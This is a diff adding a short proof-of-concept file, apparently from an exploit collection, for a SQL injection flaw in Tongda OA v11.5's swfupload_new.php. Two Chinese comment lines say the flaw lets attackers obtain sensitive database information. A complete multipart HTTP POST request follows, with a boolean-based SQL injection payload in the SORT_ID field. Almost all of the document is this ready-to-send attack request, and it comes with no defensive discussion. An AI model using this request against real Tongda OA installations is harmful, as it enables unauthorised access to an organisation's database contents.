@@ -1,0 +1,27 @@
+# 通达OA v11.5 swfupload_new.php SQL注入漏洞
+# 通达OA v11.5 swfupload_new.php 存在SQL注入漏洞，攻击者通过此漏洞可以获取数据库敏感信息
+POST /general/file_folder/swfupload_new.php?acid=80025421&bid=hd_tag_m8mv260k HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv260k
+RM-PRO-Token: 380763d6a4899ace01af5d27d059c2e6
+RM-PRO-Time: 1742808520521
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=----------GFioQpMK0vv2
+
+------------GFioQpMK0vv2
+Content-Disposition: form-data; name="ATTACHMENT_ID"
+
+1
+------------GFioQpMK0vv2
+Content-Disposition: form-data; name="ATTACHMENT_NAME"
+
+1
+------------GFioQpMK0vv2
+Content-Disposition: form-data; name="FILE_SORT"
+
+2
+------------GFioQpMK0vv2
+Content-Disposition: form-data; name="SORT_ID"
+
+0 RLIKE (SELECT  (CASE WHEN (1=1) THEN 1 ELSE 0x28 END))
+------------GFioQpMK0vv2--
